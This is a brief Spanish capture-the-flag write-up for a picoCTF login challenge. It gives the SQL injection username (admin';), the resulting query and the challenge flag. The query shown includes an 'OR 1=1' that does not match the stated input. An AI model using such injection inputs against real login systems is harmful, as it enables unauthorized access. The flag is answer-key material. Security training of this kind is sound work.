## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

## Pistas 
The password is being filtered

## Solución
Una vez más el reto se soluciona utilizando inyección sql
```
username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';OR 1=1;' AND password='password'
```

## Bandera
picoCTF{m0R3_SQL_plz_fa983901}

## Referencias
https://www.w3schools.com/sql/sql_injection.asp